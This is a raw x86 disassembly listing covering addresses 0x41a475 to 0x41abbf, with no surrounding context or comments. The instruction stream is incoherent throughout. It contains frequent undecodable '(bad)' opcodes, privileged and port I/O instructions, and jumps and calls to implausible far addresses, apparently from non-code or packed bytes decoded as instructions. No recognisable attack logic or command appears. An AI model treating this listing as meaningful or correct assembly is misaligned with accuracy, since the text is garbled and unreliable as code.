  41a475:	xchg   DWORD PTR [ebp-0x57],ebp
  41a478:	xlat   BYTE PTR ds:[ebx]
  41a479:	push   esp
  41a47a:	pcmpgtd mm2,QWORD PTR [edx-0x4f092543]
  41a481:	sub    DWORD PTR [edx-0x4bae659a],esp
  41a487:	scas   eax,DWORD PTR es:[edi]
  41a488:	dec    esp
  41a489:	mov    al,ds:0x2f473694
  41a48e:	inc    edx
  41a48f:	dec    esp
  41a490:	in     eax,dx
  41a491:	stos   BYTE PTR es:[edi],al
  41a492:	push   0xd34f0543
  41a497:	xor    ch,cl
  41a499:	in     eax,dx
  41a49a:	lahf   
  41a49b:	bound  edi,QWORD PTR [esi+0x5755a950]
  41a4a1:	mov    esp,0x6f5158bc
  41a4a6:	inc    edx
  41a4a7:	out    0xd5,eax
  41a4a9:	add    BYTE PTR [edi],0x40
  41a4ac:	inc    ebx
  41a4ad:	push   cs
  41a4ae:	jbe    0x41a437
  41a4b0:	iret   
  41a4b1:	mov    al,ds:0xd6c44ad
  41a4b6:	mov    ch,0xd8
  41a4b8:	inc    edx
  41a4b9:	aad    0x2f
  41a4bb:	jbe    0x41a45f
  41a4bd:	push   ebp
  41a4be:	or     ecx,ecx
  41a4c0:	jmp    0x20e94df4
  41a4c5:	hlt    
  41a4c6:	fiadd  DWORD PTR [edi-0x7]
  41a4c9:	rcpps  xmm1,XMMWORD PTR [eax+ebp*8+0x5b]
  41a4ce:	inc    edi
  41a4cf:	mov    ebx,0x8742b888
  41a4d4:	icebp  
  41a4d5:	mov    cl,0xfc
  41a4d7:	add    eax,0x9f50ff4c
  41a4dc:	add    bl,BYTE PTR [ebx]
  41a4de:	dec    ebp
  41a4df:	in     al,dx
  41a4e0:	loope  0x41a4f5
  41a4e2:	adc    eax,0xeb3413e3
  41a4e7:	and    ebp,DWORD PTR [eax+edx*8+0x2885af52]
  41a4ee:	mov    esp,0x714ada24
  41a4f3:	stc    
  41a4f4:	test   DWORD PTR [edi+0x636a745a],edi
  41a4fa:	stc    
  41a4fb:	lods   eax,DWORD PTR ds:[esi]
  41a4fc:	imul   eax,ebx,0x87c9d0a0
  41a502:	xor    ah,BYTE PTR [edx+0x1d]
  41a505:	sbb    edi,edi
  41a507:	jmpw   0x1ea0
  41a50b:	cs call 0x56adfad7
  41a511:	xchg   ecx,eax
  41a512:	sub    esp,DWORD PTR [edi-0x51]
  41a515:	xor    BYTE PTR [ecx+0x21],0x15
  41a519:	loop   0x41a4f0
  41a51b:	sbb    eax,0x9b19a394
  41a520:	js     0x41a527
  41a522:	popf   
  41a523:	out    dx,al
  41a524:	call   DWORD PTR [esi+0x4351635b]
  41a52a:	mov    al,0x84
  41a52c:	loop   0x41a4fa
  41a52e:	sbb    eax,0x8fb0f001
  41a533:	jle    0x41a4bb
  41a535:	imul   edi,ebp,0x2384dd60
  41a53b:	lods   al,BYTE PTR ds:[esi]
  41a53c:	inc    esp
  41a53d:	sbb    bh,BYTE PTR [eax+0x529d6e27]
  41a543:	xchg   DWORD PTR [edx+0x17701c9a],edx
  41a549:	cmp    eax,0xca61662
  41a54e:	test   al,0xd6
  41a550:	or     al,0x6f
  41a552:	(bad)  [esi+0x25a86bb9]
  41a558:	adc    al,BYTE PTR [ecx]
  41a55a:	sub    edx,DWORD PTR [eax]
  41a55c:	and    al,0x2
  41a55e:	scas   eax,DWORD PTR es:[edi]
  41a55f:	xchg   ebp,eax
  41a560:	pop    edx
  41a561:	jg     0x41a4ee
  41a563:	xlat   BYTE PTR ds:[ebx]
  41a564:	adc    al,0xa1
  41a566:	sbb    ebx,DWORD PTR [edx+eax*2]
  41a569:	push   es
  41a56a:	mov    dl,dl
  41a56c:	ror    DWORD PTR [ebx-0x34],1
  41a56f:	pop    edi
  41a570:	rcr    BYTE PTR [edi+0x22],1
  41a573:	test   al,0xe1
  41a575:	ins    BYTE PTR es:[edi],dx
  41a576:	(bad)  
  41a577:	push   ebp
  41a578:	fwait
  41a579:	clc    
  41a57a:	dec    edi
  41a57b:	jae    0x41a573
  41a57d:	(bad)  [eax-0x68dd5691]
  41a583:	in     al,0x59
  41a585:	ret    
  41a586:	cwde   
  41a587:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a588:	mov    eax,0xf4686cf8
  41a58d:	in     eax,dx
  41a58e:	jmp    0x184bec09
  41a593:	rcl    DWORD PTR [edi],cl
  41a595:	sbb    eax,0x88280553
  41a59a:	pusha  
  41a59b:	adc    ah,al
  41a59d:	sub    eax,0x6f51874f
  41a5a2:	aad    0x55
  41a5a4:	pop    esi
  41a5a5:	aas    
  41a5a6:	add    BYTE PTR [ecx],0x5a
  41a5a9:	jle    0x41a5b3
  41a5ab:	cs add al,0xee
  41a5ae:	sub    eax,0x4c1078e0
  41a5b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5b4:	lock mov ds:0xa662ec97,eax
  41a5ba:	dec    ebx
  41a5bb:	jne    0x41a55e
  41a5bd:	pop    ecx
  41a5be:	fwait
  41a5bf:	xor    ah,0x87
  41a5c2:	stos   DWORD PTR es:[edi],eax
  41a5c3:	mov    esp,0x386c0b44
  41a5c8:	sbb    dl,BYTE PTR [eax]
  41a5ca:	(bad)  
  41a5cb:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5cd:	xchg   DWORD PTR [eax],ebp
  41a5cf:	xor    DWORD PTR [ebx-0x2d],eax
  41a5d2:	jae    0x41a554
  41a5d4:	rol    DWORD PTR [ebx-0x4f9dd0b1],cl
  41a5da:	retf   0xdb4b
  41a5dd:	fwait
  41a5de:	outs   dx,DWORD PTR ds:[esi]
  41a5df:	add    dl,al
  41a5e1:	or     eax,0xe898cf1c
  41a5e6:	dec    edi
  41a5e7:	fstp   QWORD PTR [eax+0x5f51dd75]
  41a5ed:	stos   BYTE PTR es:[edi],al
  41a5ee:	enter  0xc5b1,0x35
  41a5f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5f3:	inc    esp
  41a5f4:	push   esi
  41a5f5:	xor    bh,BYTE PTR [ecx-0x1ed0aaaa]
  41a5fb:	fst    QWORD PTR [ecx-0x5faae55f]
  41a601:	pusha  
  41a602:	call   0x17bbc6c0
  41a607:	(bad)  
  41a608:	fsubr  st(0),st
  41a60a:	daa    
  41a60b:	fucomp st(4)
  41a60d:	sub    dl,ah
  41a60f:	pop    es
  41a610:	pop    esi
  41a611:	test   BYTE PTR [ebx+0x6f],dl
  41a614:	fcom   st(3)
  41a616:	jno    0x41a5f7
  41a618:	adc    ebx,DWORD PTR [esi]
  41a61a:	dec    eax
  41a61b:	(bad)  
  41a61c:	xor    BYTE PTR [eax-0x7b10e80c],dl
  41a622:	ret    
  41a623:	jecxz  0x41a676
  41a625:	mov    dl,BYTE PTR [edx-0x7026c54]
  41a62b:	out    dx,al
  41a62c:	mov    esi,0x7ef8079d
  41a631:	add    ebx,DWORD PTR [ebx+ebx*4]
  41a634:	push   es
  41a635:	sbb    ah,BYTE PTR [esi-0x6817ff67]
  41a63b:	jmp    0x1e6a:0x49f3e78
  41a642:	call   0x3f91:0x25b1843b
  41a649:	mov    ch,0x47
  41a64b:	push   ecx
  41a64c:	shr    ebx,0x65
  41a64f:	jmp    0x41a655
  41a651:	mov    esp,0x5c8378cb
  41a656:	fwait
  41a657:	scas   al,BYTE PTR es:[edi]
  41a658:	dec    edx
  41a659:	dec    ecx
  41a65a:	sbb    BYTE PTR [ebp-0x51],cl
  41a65d:	mov    dl,0x76
  41a65f:	call   eax
  41a661:	mov    esp,DWORD PTR [esi-0x73]
  41a664:	mov    edx,0xfc52baf3
  41a669:	fldcw  WORD PTR [edx]
  41a66b:	outs   dx,DWORD PTR ds:[esi]
  41a66c:	xor    DWORD PTR [eax+ecx*1+0x41],0xbad983fe
  41a674:	mov    edi,0xe80e8501
  41a679:	nop
  41a67a:	out    0xce,al
  41a67c:	push   cs
  41a67d:	out    dx,eax
  41a67e:	add    al,0x25
  41a680:	aas    
  41a681:	out    dx,eax
  41a682:	inc    esi
  41a683:	aad    0x4d
  41a685:	fcomp  DWORD PTR [ecx-0x7fb617d5]
  41a68b:	mov    ds:0xcd82a660,al
  41a690:	(bad)  
  41a691:	pop    edx
  41a692:	jecxz  0x41a69e
  41a694:	pop    eax
  41a695:	sbb    edi,DWORD PTR [edi+0x78]
  41a698:	adc    edi,esp
  41a69a:	xor    eax,esp
  41a69c:	mov    eax,0x1ae85eec
  41a6a1:	stos   DWORD PTR es:[edi],eax
  41a6a2:	sbb    eax,0x617167fa
  41a6a7:	xor    BYTE PTR [edx],bh
  41a6a9:	adc    al,0x1a
  41a6ab:	cmp    esp,edx
  41a6ad:	es pop ebx
  41a6af:	sbb    BYTE PTR [edx+0x70d53bb4],bh
  41a6b5:	pop    ebp
  41a6b6:	sub    DWORD PTR [ecx+0x1a327af5],0x643b79d2
  41a6c0:	xchg   ebx,eax
  41a6c1:	aaa    
  41a6c2:	(bad)  
  41a6c4:	pop    ss
  41a6c5:	in     eax,0xc6
  41a6c7:	adc    eax,0x5bc55d16
  41a6cc:	stos   BYTE PTR es:[edi],al
  41a6cd:	gs popf 
  41a6cf:	cmp    bl,cl
  41a6d1:	or     esi,esp
  41a6d3:	scas   al,BYTE PTR es:[edi]
  41a6d4:	adc    ecx,DWORD PTR [ecx+0x23]
  41a6d7:	call   0xa3e5344e
  41a6dc:	jmp    0x93:0xd1412d53
  41a6e3:	imul   eax,DWORD PTR [ecx],0xffffffd1
  41a6e6:	pop    ebx
  41a6e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6e8:	inc    ebx
  41a6e9:	imul   esp,DWORD PTR [esi+0x65],0xfffffff8
  41a6ed:	push   es
  41a6ee:	and    BYTE PTR [esi],bh
  41a6f0:	mov    al,0x32
  41a6f2:	js     0x41a6d9
  41a6f4:	adc    eax,DWORD PTR [esp+ecx*8+0x49]
  41a6f8:	add    BYTE PTR ds:0x3ca2e1ef,0x58
  41a6ff:	out    dx,al
  41a700:	sbb    al,0x4d
  41a702:	jne    0x41a762
  41a704:	or     DWORD PTR [ebp+0x14af2dd7],edx
  41a70a:	dec    esp
  41a70b:	stos   BYTE PTR es:[edi],al
  41a70c:	scas   eax,DWORD PTR es:[edi]
  41a70d:	inc    esp
  41a70e:	xor    DWORD PTR ds:0xf51016d6,esi
  41a714:	fwait
  41a715:	xchg   ecx,eax
  41a716:	xor    eax,0x9063e4c3
  41a71b:	rcr    DWORD PTR es:[ecx],cl
  41a71e:	mov    ah,BYTE PTR [eax-0x229fbbd]
  41a724:	dec    esi
  41a725:	popa   
  41a726:	xchg   edi,eax
  41a727:	int    0x8f
  41a729:	ja     0x41a7a8
  41a72b:	push   esi
  41a72c:	inc    edi
  41a72d:	pop    ebp
  41a72e:	popf   
  41a72f:	aaa    
  41a730:	pop    ss
  41a731:	xor    ah,dl
  41a733:	and    BYTE PTR [edx+edx*1+0x3a51e2ae],cl
  41a73a:	sbb    DWORD PTR [ebp+0x4310d229],ebx
  41a740:	icebp  
  41a741:	lds    esp,FWORD PTR [eax+0x230c6ea1]
  41a747:	inc    ebp
  41a748:	xor    esp,DWORD PTR [ecx]
  41a74a:	and    edi,DWORD PTR [esi+edx*8-0x68]
  41a74e:	jecxz  0x41a6ea
  41a750:	aad    0xf7
  41a752:	sub    ebp,DWORD PTR [edx]
  41a754:	retf   
  41a755:	loop   0x41a6e6
  41a757:	mov    cl,0x12
  41a759:	sbb    ebx,DWORD PTR [edi+0x27]
  41a75c:	add    DWORD PTR ds:0x72b25d25,0xf8c1d44
  41a766:	mov    DWORD PTR [edi+0x35530191],edi
  41a76c:	lds    edi,FWORD PTR cs:[esi-0x3d]
  41a770:	cdq    
  41a771:	enter  0x2e56,0x5f
  41a775:	xchg   edi,eax
  41a776:	mov    edi,0x6bf76f6f
  41a77b:	fisttp QWORD PTR [edi-0x5b]
  41a77e:	xchg   ebx,eax
  41a77f:	bound  ecx,QWORD PTR [ecx+eax*2]
  41a782:	add    ebp,DWORD PTR [ebx-0x14]
  41a785:	pop    ss
  41a786:	adc    ch,BYTE PTR [edi]
  41a788:	and    eax,0x5e76e0a3
  41a78d:	(bad)  
  41a78e:	fwait
  41a78f:	(bad)  
  41a790:	pop    edx
  41a791:	mov    eax,ds:0x317b342d
  41a796:	pop    edi
  41a797:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a798:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a799:	cmc    
  41a79a:	push   ecx
  41a79b:	xchg   ebx,eax
  41a79c:	pushf  
  41a79d:	dec    esi
  41a79e:	outs   dx,BYTE PTR ds:[esi]
  41a79f:	gs pop esi
  41a7a1:	jecxz  0x41a818
  41a7a3:	cwde   
  41a7a4:	xor    eax,0x99d3dcc9
  41a7a9:	push   ebx
  41a7aa:	cmp    al,0x1
  41a7ac:	push   eax
  41a7ad:	cs aaa 
  41a7af:	retf   
  41a7b0:	push   ss
  41a7b1:	cmp    eax,0xca461e14
  41a7b6:	(bad)  
  41a7b8:	fldln2 
  41a7ba:	ror    BYTE PTR [esi+0x46abd3af],cl
  41a7c0:	or     al,0x18
  41a7c2:	aad    0x62
  41a7c4:	mov    ebx,0xd47883c2
  41a7c9:	xor    ebp,ebp
  41a7cb:	bound  ecx,QWORD PTR [esi+0x64]
  41a7ce:	push   cs
  41a7cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7d0:	mov    ?,ebp
  41a7d2:	and    eax,0xc0aabf56
  41a7d7:	xchg   esi,eax
  41a7d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7d9:	push   ecx
  41a7da:	mov    ecx,0x81c8eff0
  41a7df:	mov    al,ds:0x92500b10
  41a7e4:	lock dec eax
  41a7e6:	xor    DWORD PTR [edi+eiz*1],ebp
  41a7e9:	daa    
  41a7ea:	inc    esi
  41a7eb:	push   ebp
  41a7ec:	into   
  41a7ed:	push   eax
  41a7ee:	cs addr16 cld 
  41a7f1:	test   DWORD PTR [edi+0x50],ecx
  41a7f4:	lock enter 0xad63,0x6f
  41a7f9:	jne    0x41a7d3
  41a7fb:	and    al,0x38
  41a7fd:	or     edx,edi
  41a7ff:	mov    dl,0x10
  41a801:	stc    
  41a802:	repz jmp 0xf0a2f399
  41a808:	pop    edx
  41a809:	lods   eax,DWORD PTR ds:[esi]
  41a80a:	sbb    ebp,DWORD PTR [edi+ebx*2+0x65ae96a]
  41a811:	sbb    ebp,0x250a2c38
  41a817:	sbb    edx,esi
  41a819:	lahf   
  41a81a:	xchg   ebp,eax
  41a81b:	mov    dl,0x34
  41a81d:	sahf   
  41a81e:	jmp    FWORD PTR [ebx]
  41a820:	sub    al,BYTE PTR [esi-0x2288f6ad]
  41a826:	ret    0xd151
  41a829:	xchg   edi,eax
  41a82a:	mov    esi,0xaf0d90f
  41a82f:	jge    0x41a82d
  41a831:	sub    eax,0x6bdd275a
  41a836:	sbb    dh,BYTE PTR [ebx+0x54]
  41a839:	push   esi
  41a83a:	(bad)  
  41a83b:	hlt    
  41a83c:	mov    cl,BYTE PTR [ecx+eiz*2-0x77]
  41a840:	sbb    esp,DWORD PTR [eax]
  41a842:	mov    ah,0x7a
  41a844:	inc    edi
  41a845:	xchg   esi,eax
  41a846:	sub    DWORD PTR [ebx],esi
  41a848:	sub    bl,cl
  41a84a:	inc    ebp
  41a84b:	mov    edx,0xec9edabd
  41a850:	and    edx,DWORD PTR [ebp+0x45]
  41a853:	mov    eax,ds:0x852234f8
  41a858:	lds    eax,FWORD PTR [edx]
  41a85a:	arpl   WORD PTR [ebx+0x332f5600],bx
  41a860:	add    BYTE PTR [esp+eax*2+0x4f90b42d],0x87
  41a868:	aas    
  41a869:	dec    esi
  41a86a:	and    DWORD PTR [ecx],ebx
  41a86c:	jmp    0x41a867
  41a86e:	mov    esp,0xb6be49ab
  41a873:	popf   
  41a874:	mov    ch,0x79
  41a876:	outs   dx,BYTE PTR ds:[esi]
  41a877:	jecxz  0x41a8bd
  41a879:	adc    bh,BYTE PTR [ebp+0x2d0faec7]
  41a87f:	mov    cl,0x3f
  41a881:	fwait
  41a882:	loop   0x41a831
  41a884:	xor    eax,0x5808e73a
  41a889:	popa   
  41a88a:	mov    eax,0x36a98cb2
  41a88f:	iret   
  41a890:	add    BYTE PTR [esi+ebx*8-0x6d],bh
  41a894:	cmp    DWORD PTR [edx+0x28ee0a63],edi
  41a89a:	mov    eax,DWORD PTR [eax+0x3e9fcdfd]
  41a8a0:	and    dh,BYTE PTR [eax]
  41a8a2:	xor    cl,BYTE PTR [ebx+0x3d]
  41a8a5:	push   0x91f3aa5d
  41a8aa:	xlat   BYTE PTR ds:[ebx]
  41a8ab:	jb     0x41a863
  41a8ad:	or     DWORD PTR [ebp-0x71177da1],ebx
  41a8b3:	call   0xb759:0xf7a52b3f
  41a8ba:	iret   
  41a8bb:	sub    bl,dl
  41a8bd:	xchg   edi,eax
  41a8be:	xchg   ebx,eax
  41a8bf:	rcr    al,cl
  41a8c1:	invd   
  41a8c3:	dec    edi
  41a8c4:	xchg   dl,al
  41a8c6:	dec    eax
  41a8c7:	pop    edx
  41a8c8:	and    BYTE PTR [edi],al
  41a8ca:	int3   
  41a8cb:	ins    DWORD PTR es:[edi],dx
  41a8cc:	mov    bl,0xe6
  41a8ce:	dec    esi
  41a8cf:	lahf   
  41a8d0:	mov    edx,0x1874a958
  41a8d5:	aad    0x84
  41a8d7:	stc    
  41a8d8:	jae    0x41a932
  41a8da:	inc    ebx
  41a8db:	push   ecx
  41a8dc:	aad    0xe4
  41a8de:	mov    fs,WORD PTR [eax+esi*8-0x51acba1a]
  41a8e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8e6:	mov    WORD PTR [ebx],gs
  41a8e8:	jge    0x41a8d5
  41a8ea:	imul   ebx,DWORD PTR [ebx],0xffffff89
  41a8ed:	jbe    0x41a8f7
  41a8ef:	dec    ebp
  41a8f0:	push   0x4c
  41a8f2:	pusha  
  41a8f3:	scas   al,BYTE PTR es:[edi]
  41a8f4:	xchg   edx,eax
  41a8f5:	dec    ecx
  41a8f6:	jle    0x41a96b
  41a8f8:	ss pushf 
  41a8fa:	mov    eax,0xc1f6608d
  41a8ff:	imul   eax,esi,0x12
  41a902:	mov    cs,edx
  41a904:	in     eax,0x49
  41a906:	mov    ah,0xd8
  41a908:	dec    edx
  41a909:	push   ebp
  41a90a:	lds    edx,FWORD PTR [ebx-0x4605211]
  41a910:	stos   BYTE PTR es:[edi],al
  41a911:	(bad)  
  41a912:	sbb    ebx,ecx
  41a914:	pop    eax
  41a915:	push   ecx
  41a916:	mov    ebx,0xbed5db9a
  41a91b:	sti    
  41a91c:	cdq    
  41a91d:	or     DWORD PTR [ecx],edx
  41a91f:	loop   0x41a8c3
  41a921:	push   es
  41a922:	cmp    eax,0xe15a4024
  41a927:	sub    dl,ch
  41a929:	jno    0x41a8ef
  41a92b:	pop    ebx
  41a92c:	dec    edi
  41a92d:	cdq    
  41a92e:	in     eax,dx
  41a92f:	out    0xfb,eax
  41a931:	and    DWORD PTR [edi-0x452982ea],edi
  41a937:	data16 int3 
  41a939:	jae    0x41a96f
  41a93b:	outs   dx,DWORD PTR ds:[esi]
  41a93c:	xor    BYTE PTR [ebp+0xb],0xf9
  41a940:	sub    al,0xd6
  41a942:	rcr    bh,1
  41a944:	xchg   esp,eax
  41a945:	mov    bh,0x97
  41a947:	inc    esi
  41a948:	jge    0x41a9ac
  41a94a:	mov    bl,0xf6
  41a94c:	es pshufw mm7,mm3,0xe8
  41a951:	xchg   BYTE PTR [esi],bh
  41a953:	arpl   WORD PTR [eax],di
  41a955:	or     BYTE PTR [eax+ecx*8-0x1e],bh
  41a959:	ret    0x32a3
  41a95c:	std    
  41a95d:	fmul   QWORD PTR [edx]
  41a95f:	push   ebp
  41a960:	addr16 pop ebx
  41a962:	lods   al,BYTE PTR ds:[esi]
  41a963:	sbb    BYTE PTR [edx-0x5c7a5c36],ah
  41a969:	leave  
  41a96a:	pusha  
  41a96b:	ins    DWORD PTR es:[edi],dx
  41a96c:	push   ebp
  41a96d:	mov    ebp,0xb4b4676b
  41a972:	ins    DWORD PTR es:[edi],dx
  41a973:	shl    DWORD PTR [ebx-0x7e],cl
  41a976:	fs ins BYTE PTR es:[edi],dx
  41a978:	jp     0x41a9e3
  41a97a:	shr    bl,cl
  41a97c:	fidiv  DWORD PTR [edx+esi*2+0x2df6b939]
  41a983:	aaa    
  41a984:	jmp    0x5170:0x48ca4806
  41a98b:	out    dx,eax
  41a98c:	rol    BYTE PTR [esi],cl
  41a98e:	imul   esi,ecx,0xf67fae1e
  41a994:	mov    WORD PTR [esi+0x11],fs
  41a997:	stc    
  41a998:	fs jge 0x41a947
  41a99b:	pop    esi
  41a99c:	pop    esp
  41a99d:	fcomp  QWORD PTR [edi+esi*4-0x74bd93d2]
  41a9a4:	or     edx,DWORD PTR [edi+eiz*2]
  41a9a7:	stos   BYTE PTR es:[edi],al
  41a9a8:	sar    DWORD PTR [eax],1
  41a9aa:	push   edx
  41a9ab:	stc    
  41a9ac:	adc    BYTE PTR [eax+0x4d],dh
  41a9af:	push   ebp
  41a9b0:	in     eax,0x72
  41a9b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9b3:	inc    edi
  41a9b4:	sbb    DWORD PTR [ecx+edx*8+0x14],esi
  41a9b8:	repnz sub BYTE PTR [ebp+0x5f],ah
  41a9bc:	cmp    al,0x9b
  41a9be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9bf:	test   DWORD PTR [edi-0x31aa21a],esp
  41a9c5:	push   esi
  41a9c6:	xlat   BYTE PTR ds:[ebx]
  41a9c7:	pushf  
  41a9c8:	xor    BYTE PTR [edi-0x5a],dl
  41a9cb:	inc    ebp
  41a9cc:	and    BYTE PTR ds:0x304e22c6,dl
  41a9d2:	push   0xab0b5a4c
  41a9d7:	xor    edx,DWORD PTR [ecx-0x12]
  41a9da:	lea    ebx,[ecx]
  41a9dc:	rol    BYTE PTR [esi],cl
  41a9de:	jmp    0x2255cef6
  41a9e3:	in     al,0x81
  41a9e5:	xchg   esp,eax
  41a9e6:	jno    0x41aa23
  41a9e8:	push   es
  41a9e9:	iret   
  41a9ea:	(bad)  
  41a9eb:	popa   
  41a9ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9ed:	sub    eax,0x3317b381
  41a9f2:	in     al,dx
  41a9f3:	xor    BYTE PTR [ecx+0x25],ch
  41a9f6:	shrd   DWORD PTR [esi],ebp,0x81
  41a9fa:	inc    ebp
  41a9fb:	pop    esp
  41a9fc:	add    BYTE PTR cs:[ebx+0x1ccd20f4],al
  41aa03:	mov    ebx,0x878a5a21
  41aa08:	test   al,0x3e
  41aa0a:	(bad)  
  41aa0b:	jle    0x41a9a3
  41aa0d:	jbe    0x41aa06
  41aa0f:	jns    0x41a9a3
  41aa11:	inc    edx
  41aa12:	pusha  
  41aa13:	mov    ecx,0xd4edfb56
  41aa18:	out    dx,al
  41aa19:	hlt    
  41aa1a:	(bad)  
  41aa1b:	fcomp  QWORD PTR [edi]
  41aa1d:	shl    BYTE PTR ds:[edx+0x13bccefa],0x35
  41aa25:	(bad)  
  41aa26:	adc    DWORD PTR [eax-0x14],ebx
  41aa29:	mov    bh,0x9f
  41aa2c:	cmp    eax,0xdebc31e3
  41aa31:	ins    BYTE PTR es:[edi],dx
  41aa32:	inc    esi
  41aa33:	xor    edx,DWORD PTR [esi]
  41aa35:	jle    0x41aa75
  41aa37:	add    BYTE PTR [ecx-0x3a],dl
  41aa3a:	sbb    DWORD PTR [eax+0x3f2a0b8d],edi
  41aa40:	mov    ah,0x87
  41aa42:	cld    
  41aa43:	mov    edi,0x38ded257
  41aa48:	imul   ebp,DWORD PTR [ebp+0x68b0c84c],0x75b71fe2
  41aa52:	mov    dl,0x3e
  41aa54:	retf   0xf13a
  41aa57:	scas   eax,DWORD PTR es:[edi]
  41aa58:	mov    eax,0xf110d9c9
  41aa5d:	arpl   WORD PTR [edx],di
  41aa5f:	mov    al,0x28
  41aa61:	or     ecx,ecx
  41aa63:	fwait
  41aa64:	(bad)  
  41aa65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa66:	dec    esp
  41aa67:	in     al,dx
  41aa68:	fild   WORD PTR [ebx]
  41aa6a:	mov    eax,ds:0x14783574
  41aa6f:	jb     0x41aa55
  41aa71:	or     eax,0x3bec6f92
  41aa76:	pop    ss
  41aa77:	sti    
  41aa78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa79:	adc    BYTE PTR [ebp+eiz*4-0x2f],dl
  41aa7d:	fild   WORD PTR ds:0x7500e484
  41aa83:	cs inc edi
  41aa85:	xchg   esi,eax
  41aa86:	jmp    0xebd0:0x57ab09ed
  41aa8d:	stos   BYTE PTR es:[edi],al
  41aa8e:	add    eax,0x3dad93b3
  41aa93:	call   0x2690c555
  41aa98:	out    0xec,al
  41aa9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa9b:	lods   eax,DWORD PTR ds:[esi]
  41aa9c:	das    
  41aa9d:	xchg   ebp,eax
  41aa9e:	rol    DWORD PTR [edx+0x3c],1
  41aaa1:	popf   
  41aaa2:	loopne 0x41aadb
  41aaa4:	(bad)  
  41aaa5:	adc    cl,dl
  41aaa7:	add    cl,bl
  41aaa9:	pushf  
  41aaaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aaab:	jo     0x41ab0d
  41aaad:	mov    al,0xf8
  41aaaf:	sahf   
  41aab0:	mov    es:0x87795f31,al
  41aab6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aab7:	test   al,0x14
  41aab9:	sbb    eax,0x1fb9b359
  41aabe:	retf   
  41aabf:	pop    edi
  41aac0:	dec    edi
  41aac1:	sub    eax,0x26cf3d92
  41aac6:	out    dx,al
  41aac7:	das    
  41aac8:	retf   
  41aac9:	inc    ecx
  41aaca:	xchg   edx,eax
  41aacb:	jne    0x41ab29
  41aacd:	push   es
  41aace:	pop    eax
  41aacf:	mov    esi,cr1
  41aad2:	mov    ds:0x45a84297,al
  41aad7:	and    dl,BYTE PTR [ecx]
  41aad9:	sub    eax,0xc54f4b54
  41aade:	sbb    bl,BYTE PTR [ecx+0x17046f1d]
  41aae4:	inc    edi
  41aae5:	fs hlt 
  41aae7:	add    al,0xc3
  41aae9:	les    ebp,FWORD PTR [ecx-0xffe1ea]
  41aaef:	mov    ds:0xeee9d46e,al
  41aaf4:	xchg   esp,eax
  41aaf5:	fs stos DWORD PTR es:[edi],eax
  41aaf7:	call   0x49d8:0xc198da59
  41aafe:	cld    
  41aaff:	xchg   DWORD PTR [esi+0x37],edx
  41ab02:	cmp    BYTE PTR ds:[edi-0x42],cl
  41ab06:	jns    0x41ab39
  41ab08:	into   
  41ab09:	call   0xb6304f20
  41ab0e:	mov    ebp,0xb02bebe9
  41ab13:	imul   esi,DWORD PTR [ebx],0xffffffb1
  41ab16:	(bad)  
  41ab17:	xchg   esp,eax
  41ab18:	push   ecx
  41ab19:	mov    eax,0xdab7d4a3
  41ab1e:	jbe    0x41ab98
  41ab20:	enter  0x846c,0x95
  41ab24:	nop
  41ab25:	dec    ecx
  41ab26:	neg    esp
  41ab28:	iret   
  41ab29:	jg     0x41aac4
  41ab2b:	mov    cl,0xe3
  41ab2d:	xor    ecx,ebx
  41ab2f:	rcl    BYTE PTR [edi],1
  41ab31:	and    DWORD PTR [ebp+ebx*4+0x549cc375],esi
  41ab38:	jo     0x41aac1
  41ab3a:	or     eax,0x702f1758
  41ab3f:	out    0xae,eax
  41ab41:	inc    edx
  41ab42:	test   ah,al
  41ab44:	imul   eax,DWORD PTR [esi],0xffffffae
  41ab47:	xor    al,0xc6
  41ab49:	xchg   BYTE PTR [esp+esi*2+0x6080b582],dh
  41ab50:	add    BYTE PTR [eax+0x40],0x6c
  41ab54:	inc    edx
  41ab55:	test   al,0x8d
  41ab57:	xchg   BYTE PTR [ebp-0x2],al
  41ab5a:	mov    edi,edx
  41ab5c:	pop    esp
  41ab5d:	stos   DWORD PTR es:[edi],eax
  41ab5e:	and    BYTE PTR [edx+0x6e],dh
  41ab61:	lods   al,BYTE PTR ds:[esi]
  41ab62:	sbb    eax,0x28cf71a8
  41ab67:	inc    esp
  41ab68:	lahf   
  41ab69:	jnp    0xf923c77c
  41ab6f:	add    eax,0x1ab595ea
  41ab74:	xor    eax,0x8488c1a7
  41ab79:	xchg   BYTE PTR [edi+edi*4],ch
  41ab7c:	add    cl,bl
  41ab7e:	mov    edi,0x2f171a7a
  41ab83:	mov    dh,0x82
  41ab85:	add    BYTE PTR [esi+0x52],bl
  41ab88:	push   eax
  41ab89:	fwait
  41ab8a:	cmp    edi,DWORD PTR [edx+ebp*4+0x3b]
  41ab8e:	sbb    dh,BYTE PTR [eax+0x7c3a3830]
  41ab94:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab96:	push   eax
  41ab97:	or     ah,BYTE PTR [edi-0x24d30c57]
  41ab9d:	es mov ecx,0x20fd86cc
  41aba3:	jno    0x41ab79
  41aba5:	pop    ds
  41aba6:	div    BYTE PTR cs:[ecx+0x49]
  41abaa:	lahf   
  41abab:	es test ebx,edx
  41abae:	sbb    DWORD PTR ds:0xb97967b3,esi
  41abb4:	xchg   ebp,eax
  41abb5:	jne    0x41ac14
  41abb7:	jbe    0x41ab71
  41abb9:	xchg   edx,eax
  41abba:	inc    eax
  41abbb:	jo     0x41ab86
  41abbd:	jp     0x41ab48
  41abbf:	es je  0x41aba0
